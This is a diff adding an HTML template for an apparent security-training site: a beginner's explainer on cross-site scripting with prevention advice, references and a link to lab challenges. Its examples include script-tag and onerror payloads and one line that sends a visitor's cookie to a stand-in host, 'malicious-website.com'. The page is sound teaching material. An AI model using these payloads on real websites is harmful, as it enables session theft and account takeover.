@@ -1,0 +1,474 @@
+{% extends 'base.html' %}
+
+{% block content %}
+<style>
+    body, h1, h2, h3, h4, h5, h6, p, ul, li, a, div, img {
+        margin: 0;
+        padding: 0;
+        border: 0;
+        outline: 0;
+        font-size: 100%;
+        font-family: inherit;
+        vertical-align: baseline;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #11111;
+        color: #333;
+    }
+    
+    .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 20px;
+        background-color: #007BFF;
+        color: #fff;
+        background: linear-gradient(to bottom, #007BFF, #0055FF);
+        box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.1)
+    }
+
+    .header-left {
+        display: flex;
+        align-items: center;
+    }
+
+    .header-logo {
+        max-width: 50px;
+        margin-right: 10px;
+    }
+
+    .header-title {
+        font-size: 32px;
+        letter-spacing: 1px;
+    }
+
+    .menu {
+        display: flex;
+        align-items: center;
+        list-style-type: none;
+        padding: 0;
+    }
+
+    .menu-item {
+        display: inline-block;
+        margin-right: 25px;
+    }
+
+    .menu-item a,
+.learn-more-button {
+    text-decoration: none;
+}
+
+    .menu-item a {
+        color: #fff;
+        font-weight: bold;
+        transition: color 0.3s;
+    }
+
+    .menu-item a:hover {
+        color: #ffc107;
+        transform: translateY(-3px);    }
+
+   
+    
+    .menu-item a.active {
+        color: #ffc107;
+        font-weight: bold;
+    }
+    
+
+    .submenu {
+        display: none;
+        position: absolute;
+        background-color: #fff;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+        padding: 10px;
+        z-index: 1;
+        text-align: center; /* Center the content horizontally */
+        background-color: #f0f0f0; /* Change the background color to gray */
+
+    }
+    
+    .menu-item:hover .submenu {
+        display: block;
+    }
+    
+    .submenu a {
+        display: block;
+        padding: 5px 0;
+        color: #333;
+        transition: color 0.3s;
+        text-decoration: none;
+    }
+    
+    .submenu a:hover {
+        color: #007BFF;
+        transform: translateY(-3px);
+
+    }
+    
+    .footer {
+        background-color: #333;
+        color: #fff;
+        padding: 20px 0;
+        text-align: center;
+      }
+      
+      .footer-links a {
+        color: #fff;
+        margin: 0 10px;
+        text-decoration: none;
+      }
+      
+      .footer-project-name {
+        font-size: 18px;
+        margin-top: 10px;
+
+}
+
+
+
+
+
+.title-container {
+    text-align: center;
+    padding: 30px 0;
+}
+
+.title {
+    font-size: 40px;
+    letter-spacing: 1px;
+    margin: 0;
+    color: #007BF11;
+    font-weight: bold;
+
+
+}
+
+.security-issue {
+    background-color: #f5f5f5;
+    border-radius: 5px;
+    overflow: hidden;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    margin: 40px auto;
+    max-width: 1000px;
+}
+
+.issue-image {
+    text-align: center;
+    padding: 30px;
+}
+
+.issue-image img {
+    max-width: 80%;
+    height: auto;
+    border-radius: 10px;
+}
+
+.issue-text {
+    padding: 30px;
+    font-size: 16px;
+    line-height: 1.6;
+    text-align: justify;
+}
+
+
+.learn-more-button {
+    display: inline-block;
+    background-color: #007BFF;
+    color: #fff;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: background-color 0.3s, color 0.3s;
+    margin-top: 20px;
+    text-decoration: none;
+}
+
+.learn-more-button:hover {
+    background-color: #0055FF;
+}
+
+.code-block {
+    background-color: #f7f7f7;
+    padding: 10px;
+    border-radius: 5px;
+    margin: 15px 0;
+    white-space: pre-wrap;
+    font-family: monospace;
+    font-size: 14px;
+    line-height: 1.5;
+}
+
+</style>
+
+<div class="security-issue">
+
+<div class="title-container">
+    <h1 class="title">Cross-site scripting XSS    </h1>
+</div>
+
+        <div class="issue-image">
+        <img src="/media/xss 1.png" alt="Cross-site scripting XSS">
+        <p>Picture 3 : picture from GeeksForGeeks </p>
+    </div>
+
+<div class="security-issue">
+    <div class="issue-text">
+        <h3>Cross-site Scripting (XSS) Explained</h3>
+        <p>
+            In this section, we're going to talk about a sneaky trick called cross-site scripting (or XSS for short) 
+            and how to spot and stop it.</p><br>
+     
+        <h4>What's Cross-site Scripting (XSS)?</h4><br>
+        <p>Imagine you're at a party and someone gives you fake instructions pretending they're from the host.
+             Cross-site scripting is kinda like that. It's a way for bad actors to slip fake instructions (in the form of malicious code) 
+             into a website. When another user visits the website, their browser follows these fake instructions.
+              This can let the  bad actor pretend to be the user, do things on their behalf, or steal their information.
+             If that user is an admin or someone powerful on the site, the  bad actor could take over the entire website.</p><br>
+       
+       
+        <h4>How Does It Work?</h4>
+        <p>The trick here is that the attacker convinces a website to send bad code (usually JavaScript) to the user.
+             When this bad code runs in the user's browser, the attacker can do all sorts of things,
+             like steal their data or control their actions on the site.</p>       
+        
+        <h3>Testing for XSS: </h3>
+    <p>A common way to check if a site has this vulnerability is by trying to make it run a simple command, like popping up an alert box.
+         If you can make the site show an alert box, it might be vulnerable to more sneaky tricks..</p>
+    
+    
+   <h4> A Quick Note for Techies:</h4>
+   <p>If you're using the Chrome browser (version 92 or later), there's a small change.
+     The usual alert trick doesn't work in some situations. So, instead of using alert(), you can use print(). 
+     We've updated our examples to show this where needed.
+     If you're curious about why this change happened, there's a blog post you can read!</p><br>
+   <p><strong> Quick Recap:</strong> Cross-site scripting is like someone slipping fake notes into your friend's pile of notes,
+     making them do things they didn't intend to.
+     Always be cautious of such tricks!</p><br>
+    
+    
+   <h4> What Can XSS (Cross-site Scripting) Do?</h4><br>
+    <p>Imagine if someone could magically control your actions without you realizing. That's sort of what happens with XSS.
+         If a  bad actor uses this sneaky trick on a website, they can:</p><br>
+    
+         
+         <p><strong>Pretend to be you:</strong>  It's like they wear a mask and act as if they're you on the website.
+            <p><strong>  Do Anything You Can:</strong> Whatever you're allowed to do on the site, they can do too, like posting comments or changing settings.</p>
+         <p><strong> See What You See:</strong>  If you can view certain private messages or photos, so can they.</p>
+            <p><strong> Steal Your Password:</strong>  They can grab your login details,
+                 which could let them into other sites if you reuse passwords.</p>
+                 <p><strong>Vandalize the Website:</strong> Like digital graffiti, they can change how the website looks or works for others.</p>
+         <p><strong> Hide Bad Stuff:</strong>  They can secretly add harmful functions to the site that might hurt other visitors.</p>
+         How Bad Is It?</p><br>
+         <p><strong>The damage from XSS depends on the website and who's affected:</strong></p>
+         
+            <p><strong> Simple Websites:</strong>  For basic sites with only public info and no user accounts, the damage might be small.
+                <p><strong>Sensitive Data Sites:</strong> If it's a site where you check your bank account, emails, or medical info,
+                     the situation can be really bad.</p>
+                    <p><strong>High Power Users: </strong> If someone important, like an admin of a site, gets hit with XSS,
+                         it's like giving the keys to the kingdom. The bad actor could control everything and everyone on the site.</p><br>
+         
+         <p><strong> Quick Recap:</strong>  XSS lets bad actors pull puppet strings on websites. 
+            The harm varies, but it can go from being a small prank to a full-blown robbery. Always be alert!</p><br>
+         
+    
+
+    
+
+           <h4> Spotting Weak Spots for Cross-Site Scripting (XSS)</h4><br>
+
+           <p><strong>Think of XSS like someone slipping a sneaky note into a pile you're reading from. How does this happen?</strong></p><br>
+            
+            <p><strong>Not Checking Notes:</strong> If a website blindly trusts and uses everything users give it 
+                (like comments or search words) without double-checking, it's vulnerable.</p>
+                <p><strong>Reading Notes Out Loud Wrong:</strong> If a website shows user input (those notes) exactly as it's given, 
+                    without making sure it's safe, bad stuff can be shown to other users.</p><br>
+                    <p><strong>How to Catch and Stop XSS:</strong><br>
+            
+           <p> The good news is that with some smart moves, we can stop these sneaky notes from causing harm:<p><br>
+            
+            <p><strong>Always Double-Check:</strong> Just like you'd check any note you're given, always double-check user inputs. Is it looking weird or suspicious?</p>
+                <p><strong> Speak Clearly and Safely:</strong> When showing user input, make sure it's shown in a safe way so that any sneaky stuff doesn't work.</p>
+                    
+                    <p><strong> Make Safe Coding a Habit:</strong> Tools like Veracode can help teach how to write code that's safe from XSS tricks.</p>
+                    
+                        <p><strong> Guard Up at Every Stage:</strong> Just like you'd be alert at different parts of a party
+                             (entry, during, and exit), be alert at every stage of making a website.
+                              Check for weak spots and fix them before they can be exploited.</p><br>
+                            <p><strong> Quick Recap:</strong> XSS is like sneaky notes mixed in with legit ones.
+                                 Always double-check the notes and be careful how you use them.
+                                  Stay alert and use tools to help guard against these tricks!</p>
+
+   <div class="code-block">
+    <h4>Example 1: Comment Section Trick</h4>
+    <pre><code>
+    <h4>Scenario:</h4>
+    Imagine a blog site where users can leave comments.
+
+    Normal Comment:
+    A user writes: "Great article! I loved it."
+
+    Sneaky XSS Comment:
+    A malicious user writes:
+    &lt;script&gt;alert('Hacked!');&lt;/script&gt;
+    </code></pre>
+   </div>
+
+
+   <div class="code-block">
+    <h4> Example 2: Search Bar Shenanigans</h4>
+    <pre><code>
+    <h4>Scenario:</h4>
+    An online bookstore allows you to search for books by title.
+   
+    Normal Search:
+    You type "Harry Potter" and get relevant results.
+    
+    Sneaky XSS Search:
+    A malicious user types:
+    &lt;script&gt;document.location='http://malicious-website.com/steal-cookie.php?cookie='+document.&lt;/script&gt;
+    </code></pre>
+   </div>
+           
+  
+   
+   <br><P>If the website is vulnerable, it might redirect the user to the attacker's website and share their session cookie, 
+    potentially allowing the attacker to impersonate that user.</p>
+    
+    <div class="code-block">
+        <h4>Example 3: Profile Name Prank</h4>
+        <pre><code>
+        <h4>Scenario:</h4>
+        A social media website lets users set their display names.
+    
+        Normal Name:
+        A user sets their name as "Alice".
+    
+        Sneaky XSS Name:
+        A malicious user sets their name as:
+        &lt;img src="nonexistent.jpg" onerror="alert('Gotcha!');"&gt;
+        </code></pre>
+    </div>
+    
+ 
+   
+   <br><p>Every time someone views the attacker's profile or their posts,
+     they get a popup saying "Gotcha!" because the image fails to load and runs the script instead.</p>
+   
+
+     <div class="code-block">
+        <h4> Example 4: URL Deception  </h4>
+        <pre><code>
+        <h4>Scenario:</h4>
+        A news website shows headlines based on a category provided in the URL.
+
+        Normal URL:
+        http://news-website.com/category=sports
+        
+        Sneaky XSS URL:
+        Someone sends you a link:
+        http://news-website.com/category= &lt;script&gt;/*malicious code here*&lt;/script&gt;
+ 
+        </code></pre>
+       </div>
+
+
+   
+   <p>When you click the link, the malicious script runs, and the attacker might do things like steal your data 
+    or change the content you see.</p><br>
+   
+   <p><strong>Quick Recap:</strong> XSS is about slipping sneaky scripts into places you wouldn't expect.
+    Like a chameleon hiding in plain sight, these scripts blend in and then cause mischief when you least expect it.
+     Always be on the lookout!</p><br>
+   
+   <h4>XSS Prevention Cheat Sheet</h4><br>
+   
+   <h4>1-Validate Input:</h4>
+   
+   <p>Check and sanitize all incoming data.</p>
+   <p>Use allow-lists, not deny-lists: only accept known good, deny everything else.</p><br>
+
+   <h4>2-Encode Data:</h4>
+   
+   <p>Use HTML encoding for any data that's output to browsers.</p>
+    <p>Ensure characters like <, >, &, " are converted to their safe HTML-encoded equivalents.</p><br>
+   
+   <h4>3-Use HTTP-only Cookies:</h4>
+   <p>Set the HTTP-only flag for cookies to make them inaccessible to JavaScript.</p><br>
+   
+   
+   <h4>4-Content Security Policy (CSP):</h4>
+   
+   <p> Implement a strong CSP to limit the JavaScript that can be executed in the browser.</p>
+   <p> Escape Content:</p><br>
+   
+   <p> Especially content that's incorporated into HTML, JavaScript, CSS, or URL query parameters.</p>
+   <p> Use Parameterized APIs:</p><br>
+   
+   <p>When possible, use parameterized functions or prepared statements which can prevent scripts from being executed.</p>
+  <p> Limit User-Controlled Data:</p><br>
+   
+   <p>Reduce or eliminate areas of the application where user-controlled data can be displayed.
+   Securely Configure Your Web Server:<p><br>
+
+   
+  <h4>5- Disable unnecessary features.</h4>
+  <p> Keep the software updated to avoid known vulnerabilities.
+  <p> Regularly Update Libraries and Frameworks:</p><br>
+   
+   <p>Outdated libraries can have known XSS vulnerabilities. Keep them updated.</p><br>
+   <p><strong>Avoid DOM-based XSS:</strong></p><br>
+   
+  <p> Be very cautious when manipulating the Document Object Model (DOM) with user data.</p>
+  <p> Validate and sanitize data before using it in DOM manipulation.</p><br>
+   
+  
+   <h4>6-Educate Developers:</h4>
+    <p>Regular training on the importance of security and common vulnerabilities can reduce the risk.</p><br>
+   
+   <p><strong>7-Regularly Audit and Test:</strong></p>
+    <p>Use tools to scan for vulnerabilities.</p>
+    <p>Employ regular penetration testing to uncover potential issues.</p><br>
+   
+    <p><strong>8-Implement a Web Application Firewall (WAF):</strong></p>
+   <p>While not a perfect solution, a WAF can help detect and block many common XSS attempts.</p><br>
+   
+   <p><strong>9-Sandbox Untrusted Content:</strong></p>
+   <p>If you must display untrusted content, consider sandboxing or isolating it in a way that it can't harm your main application.</p><br>
+   
+   <p>Remember, there's no silver bullet to eliminate XSS risks, 
+    but using a combination of these techniques will greatly reduce the chances of an attack succeeding. 
+    Stay vigilant and always be proactive in your defense strategy!</p><br>
+   
+
+   
+
+
+<h4>References:</h4>
+        <ul class="reference-list">
+            <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+            <li><a href="https://www.veracode.com/security/xssl" target="_blank">https://www.veracode.com/security/xss</a></li>
+            <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">  https://portswigger.net/web-security/cross-site-scripting</a></li>
+
+        </ul>
+    </div>
+
+
+  
+
+
+    <a href="{% url 'lab_environment:all_labs' %}" class="learn-more-button">Go to Challenges</a>
+    </div>
+
+</div>
+
+
+
+{% endblock %}
